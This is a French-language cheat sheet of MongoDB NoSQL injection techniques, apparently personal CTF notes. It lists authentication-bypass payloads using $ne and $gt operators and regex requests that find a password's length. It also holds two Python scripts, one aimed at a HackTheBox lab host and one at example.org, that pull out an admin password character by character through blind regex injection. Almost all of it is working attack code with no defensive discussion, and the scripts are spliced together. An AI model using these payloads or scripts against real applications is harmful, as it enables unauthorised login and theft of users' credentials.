# MongoDB
## Bypass de l'authent


in URL
username[$ne]=toto&password[$ne]=toto #modification avec burp par Ã©xemple

in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}




## trouver la longueur du mdp dans une requete post:


username=admin&password[$regex]=.{1}&login=login #302
username=admin&password[$regex]=.{2}&login=login #302
username=admin&password[$regex]=.{3}&login=login #302
username=admin&password[$regex]=.{4}&login=login #200 #longueur = 3 char



## utiliser les regex pour dumper un passwords:

```
#!/usr/bin/python3

import requests
import string

flag = ""
url = "http://staging-order.mango.htb/index.php"
#ajout du Content-Type: application/x-www-form-urlencoded
headers = {'Content-type': 'application/x-www-form-urlencoded'}
# Each time a 302 redirect is seen, we should restart the loop

restart = True
while restart:
    restart = False

    # Characters like *, ., &, and + has to be avoided because we use regex

    for i in string.printable:
        if i not in ['*','+','.','?','|']:
            payload = flag + i
            #utilisateur:
            #post_data = {'username[$regex]': payload + ".*", 'password[$gt]': '', 'login': 'login'}
            #mot de passe
            post_data = {'username': 'admin', 'password[$regex]': "^"+payload, 'login':'login'}
            #post_data = "username=admin&password[$regex]=" + payload +".*" + "&login=login"
            r = requests.post(url, data=post_data, headers=headers, allow_redirects=False)

            # A correct password means we get a 302 redirect
            if r.status_code == 302:
                print(payload)
                restart = True
                flag = payload


GET (payloadAllTheThings
===

import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload='?username=%s&password[$regex]=^%s' % (username, password + c)
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print("Found one more char : %s" % (password+c))
        password += c

```


